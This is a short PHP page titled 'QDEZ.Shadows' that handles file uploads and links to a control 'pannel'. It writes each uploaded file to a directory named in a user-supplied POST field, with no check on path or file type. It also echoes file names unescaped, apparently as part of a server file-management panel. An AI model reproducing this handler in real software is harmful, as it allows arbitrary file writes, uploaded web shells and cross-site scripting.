<!DOCTYPE html>
<html>
<head>
<meta charset=UTF-8>
<title>UPLOAD - QDEZ.Shadows</title>
</head>
<body>
<?php
if ($_FILES["file"]["error"] > 0) {
    echo "File error! Return Code: " . $_FILES["file"]["error"] . "<br />";
} else {
    echo "Upload: " . $_FILES["file"]["name"] . "<br />";
    echo "Type: " . $_FILES["file"]["type"] . "<br />";
    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
    echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";
    $fullname = $_POST['filepath'] . "/" . $_FILES["file"]["name"];

    if (file_exists($fullname)) {
        $fullname = $_FILES["file"]["name"];
        while (file_exists($_POST['filepath'] . "/" . $fullname)) {
            $fullname = '_' . $fullname;
        }
        $fullname = $_POST['filepath'] . "/" . $fullname;
      }
    move_uploaded_file($_FILES["file"]["tmp_name"],$fullname);
    echo '<a href="' . $fullname . '">Link</a><br />';
    echo '<a href="pannel.html">Pannel</a>';
}
?>
</body>
</html>
        